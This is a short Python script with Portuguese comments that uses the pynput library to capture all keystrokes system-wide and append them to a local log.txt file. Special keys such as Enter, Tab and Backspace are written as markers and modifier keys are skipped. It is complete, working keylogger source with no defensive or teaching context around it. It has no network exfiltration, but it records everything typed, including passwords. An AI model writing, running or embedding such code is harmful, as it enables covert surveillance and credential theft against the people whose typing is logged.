from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # Se for uma tecla "normal" e tiver um caractere válido
        if key.char is not None:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(key.char)
    except AttributeError:
        # Lógica para teclas especiais (space, enter, backspace, etc.)
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f" [{key}] ")
                

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()